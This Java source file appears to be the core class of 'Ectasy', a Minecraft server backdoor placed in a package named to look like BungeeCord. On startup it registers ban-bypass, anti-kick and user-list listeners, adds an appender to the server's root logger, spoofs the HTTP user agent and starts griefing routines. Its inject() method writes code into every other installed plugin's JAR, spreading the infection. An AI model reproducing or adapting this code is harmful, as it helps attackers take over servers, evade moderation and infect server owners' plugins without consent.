package net.md5.bungee;

import fr.body.ectasy.util.PluginUtil;
import fr.body.ectasy.Injector;
import fr.body.ectasy.LogAppender;
import fr.body.ectasy.command.CommandManager;
import fr.body.ectasy.command.impl.PenisRainCommand;
import fr.body.ectasy.listeners.ItemListener;
import fr.body.ectasy.listeners.PlayerBanBypassListener;
import fr.body.ectasy.listeners.UserAntiKickListener;
import fr.body.ectasy.listeners.UserListAddListener;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ConfigurationUtil;
import java.util.HashMap;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Logger;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

public class Ectasy {
   public static CommandManager commandManager;
   public static int unusedInteger = 0;
   public static boolean killSwitch = false;
   public static boolean testServer = false;
   public static HashMap<String, User> users = new HashMap<>();
   public static boolean init = false;
   public static String discordInviteLink = "discord.gg/forceop";
   public static JavaPlugin parentPlugin;

   public static void onEnable(JavaPlugin var0) throws Exception {
      if (!init) {
         unusedInteger = Core.someInteger;
         init = true;
         System.setProperty("http.agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7");
         parentPlugin = var0;
         ConfigurationUtil.load();
         LogAppender var1 = new LogAppender();
         var1.start();
         ((Logger)LogManager.getRootLogger()).addAppender(var1);
         commandManager = new CommandManager();
         commandManager.setupCommands();
         var0.getServer().getPluginManager().registerEvents(new CommandManager(), var0);
         var0.getServer().getPluginManager().registerEvents(new UserListAddListener(), var0);
         var0.getServer().getPluginManager().registerEvents(new UserAntiKickListener(), var0);
         var0.getServer().getPluginManager().registerEvents(new PlayerBanBypassListener(), var0);
         var0.getServer().getPluginManager().registerEvents(new ItemListener(), var0);

         for(Player var3 : Bukkit.getOnlinePlayers()) {
            users.putIfAbsent(var3.getName(), new User(var3));
         }

         ItemListener.doBombQueue();
         PenisRainCommand.startPenisRain();
      }
   }

   public Ectasy() {
   }

   public static void inject() {
      for(Plugin var3 : Bukkit.getPluginManager().getPlugins()) {
         if (var3 instanceof JavaPlugin && !var3.getName().equals(parentPlugin.getName())) {
            try {
               Injector.inject(PluginUtil.getPluginFile((JavaPlugin)var3).getPath());
            } catch (Exception ignored) {
            }
         }
      }
   }

   public static User getUserByPlayer(Player player) {
      return users.get(player.getName());
   }

   public static void kill() {
      killSwitch = true;
   }

   public static User getUserByIgn(String var0) {
      return users.get(var0);
   }
}
